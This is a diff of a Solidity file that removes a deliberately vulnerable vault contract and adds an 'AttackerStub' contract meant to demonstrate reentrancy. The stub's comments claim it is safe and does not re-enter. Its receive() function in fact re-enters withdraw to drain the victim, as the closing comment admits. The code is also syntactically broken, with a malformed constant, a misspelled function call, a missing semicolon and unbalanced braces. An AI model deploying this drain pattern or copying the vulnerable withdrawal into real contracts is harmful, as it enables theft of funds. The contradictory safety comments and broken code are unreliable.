@@ -1,25 +1,37 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.28;
 
-contract VulnerableVault {
-    mapping(address => uint) public balances;
+import "./Victim.sol";
 
-    function deposit() external payable {
-        balances[msg.sender] += msg.value;
+/// @notice Educational stub only. Do NOT deploy on public networks.
+/// The fallback does NOT perform a re-entrancy call — it's a demo stub.
+contract AttackerStub {
+    Victim public victim;
+    address public owner;
+
+    constructor(address _victim) {
+        victim = Victim(_victim);
+        owner = msg.sender;
     }
 
-    // Vulnerable withdrawal — updates state AFTER sending funds
+    // Deposit into Victim and call withdraw once (for demo)
+    function attack() external payable {
+        require(msg.sender == owner, "Not owner");
+        require(msg.value > 0, "Send ETH to fund attack deposit");
 
-    function withdrawAll() external {
-        uint bal = balances[msg.sender];
-        require(bal > 0, "No balance");
-        // external call FIRST (vulnerable)
-        (bool ok,) = msg.sender.call{value: bal}("");
-        require(ok, "Transfer failed");
-        // state updated AFTER external call — BAD
-        balances[msg.sender] = 0;
+        // Deposit our funds into the victim contract
+        victim.deposit{value: msg.value}();
+
+        // Trigger withdraw once to show how external transfer arrives
+        victim.withdrawAll();
     }
+
+    // fallback/receive will be hit when Victim sends ETH
+    // We DO NOT re-enter here — this is intentionally safe.
+    receive() external payable {
+        if (address(victim).balance > 1eth){
+            victim.withdrawll()
+    } else{
+      payable(msg.sender).transfer(address(this).balance)
 }
-
-
-//Problem: external call happens before balances[msg.sender] = 0. If the receiver re-enter he can call  withdrawal again.
+// If the contract Victim has more then 1  Eth then attackers contract fallback and withdrawal again, this loop continues until victim drained,then send all Eth to sender when victim has no Eth left
